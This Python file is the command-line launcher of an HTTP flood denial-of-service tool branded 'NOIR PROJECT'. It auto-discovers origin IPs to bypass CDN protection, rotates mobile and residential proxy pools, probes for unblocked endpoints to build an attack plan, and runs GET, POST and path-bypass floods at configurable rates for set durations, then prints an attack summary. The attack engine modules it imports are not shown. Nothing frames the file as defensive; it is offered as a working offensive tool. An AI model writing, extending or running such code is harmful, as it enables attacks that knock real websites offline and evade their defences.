import os
import sys
import json
import yaml
import argparse
import asyncio
import logging
import time
from datetime import datetime

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("noir")

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


def load_config(path: str = "config/default.yaml") -> dict:
    d = {
        "proxy": {"connect_timeout": 3, "min_pool": 5, "health_check_interval": 60, "max_fail": 3},
        "attack": {"default_duration": 3600, "default_method": "http_get_flood", "max_rps": 1000, "min_rps": 10, "initial_rps": 100},
    }
    try:
        with open(path) as f:
            loaded = yaml.safe_load(f)
            if loaded:
                _merge(d, loaded)
    except Exception:
        pass
    return d


def _merge(b: dict, o: dict):
    for k, v in o.items():
        if k in b and isinstance(b[k], dict) and isinstance(v, dict):
            _merge(b[k], v)
        else:
            b[k] = v


def c(t, s):
    codes = {"g": "32", "r": "31", "y": "33", "c": "36", "w": "37", "m": "35"}
    return f"\033[1;{codes.get(t, '37')}m{s}\033[0m"


async def heartbeat(engine, dur: float):
    start = time.time()
    while time.time() - start < dur + 2:
        await asyncio.sleep(2)
        m = engine.get_metrics()
        line = "  %s %s %s RPS:%s Tier:%d RTT:%.0fms Proxies:%d     " % (
            c('c', 'Req:' + str(m['total_requests'])),
            c('g', 'OK:' + str(m['completed'])),
            c('r', 'FAIL:' + str(m['failed'])) + ' ' + c('y', 'TO:' + str(m['timeout'])),
            c('w', '%.1f' % m['current_rps']),
            m['tier'], m['avg_response_time_ms'], m['active_proxies'])
        print('\r' + line, end="", flush=True)
    print()


async def cmd_start(args, cfg):
    target = args.target
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    print("=" * 70)
    print("  \033[1;37mNOIR\033[0m \033[1;31mPROJECT\033[0m | \033[1;90mTOTAL RECALL ENGINE v5.0 [2026]\033[0m")
    print("=" * 70)
    print(f" {c('c','[*]')} Target: {c('w',target)}")

    origin_ip = args.origin_ip
    if origin_ip == "auto":
        from core.intel_engine import TargetAnalyzer
        print(f" {c('c','[*]')} Auto-discovering origin IP...")
        ta = TargetAnalyzer()
        prof = ta.analyze(target)
        print(f" {c('g','[+]')} CMS: {prof.cms} | WAF: {prof.waf} | IP: {prof.ip}")
        if prof.is_behind_cdn and prof.origin_ips:
            print(f" {c('y','[!]')} Origin IP candidates: {prof.origin_ips[:5]}")
            origin_ip = prof.origin_ips[0]
            print(f" {c('g','[+]')} Using origin IP: {origin_ip}")
        elif not prof.is_behind_cdn:
            origin_ip = None
            print(f" {c('g','[+]')} No CDN detected, using direct mode.")

    proxy_pool = None
    health_task = None
    bg_task = None

    if args.no_proxy or origin_ip:
        print(f" {c('g','[+]')} Direct mode: no proxies needed.")
    else:
        from core.proxy_engine import ProxyPool
        proxy_pool = ProxyPool(connect_timeout=cfg["proxy"]["connect_timeout"],
                                min_pool=cfg["proxy"]["min_pool"])
        total = 0
        for f in ["proxies/http.txt", "proxies/socks4.txt", "proxies/socks5.txt"]:
            total += await proxy_pool.load_file(f)
        jpath = "config/proxies.json"
        if os.path.exists(jpath):
            try:
                with open(jpath) as f:
                    total += await proxy_pool.load(json.load(f))
            except Exception:
                pass
        if total == 0:
            print(f" {c('r','[-]')} No proxies. Use --no-proxy.")
            return
        q = min(200, total)
        print(f" {c('c','[*]')} Validating {q}/{total} proxies...")
        alive = await proxy_pool.quick_validate(q)
        if alive == 0:
            print(f" {c('r','[-]')} No valid proxies. Use --no-proxy or --origin-ip.")
            return
        print(f" {c('g','[+]')} {alive} proxies ready ({proxy_pool.stats()['pending']} pending).")
        health_task = asyncio.create_task(proxy_pool.health_loop())
        bg_task = asyncio.create_task(proxy_pool.validate_background())

    proxy_type = args.proxy_type or "mobile"
    start_tier = args.tier or (3 if origin_ip else 1)

    attack_plan = None
    if args.smart:
        from core.endpoint_engine import SmartEndpointDiscovery
        print(f" {c('c','[*]')} Smart endpoint discovery...")
        sd = SmartEndpointDiscovery()
        endps = await sd.probe(target)
        attack_plan = sd.generate_attack_plan()
        print(f" {c('g','[+]')} {len(endps)} endpoints found, {len(attack_plan)} attack vectors")
        for ep in endps[:6]:
            tag = c('r','BLOCK') if ep.blocked else c('g','OK')
            print(f"     {ep.method:6s} {ep.path:30s} {ep.status} {tag} {ep.body_len}b")
        if len(endps) > 6:
            print(f"     ... and {len(endps)-6} more")

    from core.attack_engine import AttackEngine
    engine = AttackEngine(
        proxy_pool=proxy_pool,
        no_proxy=args.no_proxy or bool(origin_ip),
        origin_ip=origin_ip,
        proxy_type=proxy_type,
        initial_rps=args.rps or cfg["attack"]["initial_rps"],
        start_tier=start_tier,
        attack_plan=attack_plan,
    )

    method = args.method or cfg["attack"]["default_method"]
    duration = args.duration or cfg["attack"]["default_duration"]

    print(f" {c('c','[*]')} Tier: {start_tier} | Method: {method} | Duration: {duration}s | RPS: {args.rps or cfg['attack']['initial_rps']}")
    print(f" {c('m','=' * 70)}")

    start = time.time()
    attack = asyncio.create_task(engine.start_attack(target, duration, method, args.rps or cfg["attack"]["initial_rps"]))
    hb = asyncio.create_task(heartbeat(engine, duration))
    await attack
    await hb

    elapsed = time.time() - start
    m = engine.get_metrics()
    tot, ok, fail, to = m["total_requests"], m["completed"], m["failed"], m["timeout"]

    print()
    print(c("w", "=" * 70))
    print(c("w", "  NOIR PROJECT | Attack Summary"))
    print(c("w", "=" * 70))
    print(f"  Target:          {target}")
    print(f"  Duration:        {int(elapsed//60)}m {int(elapsed%60)}s")
    print(f"  Total Requests:  {tot}")
    print(f"  {c('g','Completed:')}       {ok} ({ok/max(tot,1)*100:.1f}%)")
    print(f"  {c('r','Failed:')}          {fail} ({fail/max(tot,1)*100:.1f}%)")
    print(f"  {c('y','Timeout:')}         {to} ({to/max(tot,1)*100:.1f}%)")
    print(f"  Peak RPS:        {m['peak_rps']:.1f}")
    print(f"  Avg RTT:         {m['avg_response_time_ms']:.0f}ms")
    print(f"  Tier:            {m['tier']}")
    print(f"  Method:          {method}")
    print(c("w", "=" * 70))

    log = f"logs/attack_{datetime.now():%Y%m%d_%H%M%S}.log"
    try:
        with open(log, "w") as f:
            json.dump({"target": target, "metrics": m}, f, indent=2)
        print(f" {c('g','[+]')} Log: {log}")
    except Exception:
        pass

    if health_task:
        health_task.cancel()
    if bg_task:
        bg_task.cancel()
    for t in [health_task, bg_task]:
        if t:
            try:
                await t
            except Exception:
                pass


async def main():
    p = argparse.ArgumentParser(description="NOIR PROJECT v5.0 [2026]")
    p.add_argument("--target", "-t", required=True)
    p.add_argument("--method", "-m", default="", choices=["http_get_flood", "http_post_flood", "bypass_path_flood"])
    p.add_argument("--duration", "-d", type=int, default=0)
    p.add_argument("--rps", "-r", type=int, default=0)
    p.add_argument("--tier", type=int, default=0, choices=[0, 1, 2, 3], help="Start at Tier (1=curl, 2=proxy, 3=origin)")
    p.add_argument("--no-proxy", action="store_true", help="Direct attack without proxies")
    p.add_argument("--origin-ip", nargs="?", const="auto", default=None, help="Origin IP or 'auto' for auto-discover")
    p.add_argument("--proxy-type", choices=["mobile", "residential", "ipv6", "datacenter"], default="mobile")
    p.add_argument("--smart", action="store_true", help="Smart endpoint discovery + rotation")
    p.add_argument("--config", "-c", default="config/default.yaml")
    args = p.parse_args()

    if args.origin_ip == "auto" and not args.target:
        print("--origin-ip auto requires --target")
        return

    cfg = load_config(args.config)
    await cmd_start(args, cfg)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n {c('y','[!]')} Cancelled.")
        sys.exit(0)
    except Exception as e:
        logger.error("Fatal: %s", str(e), exc_info=True)
        sys.exit(1)
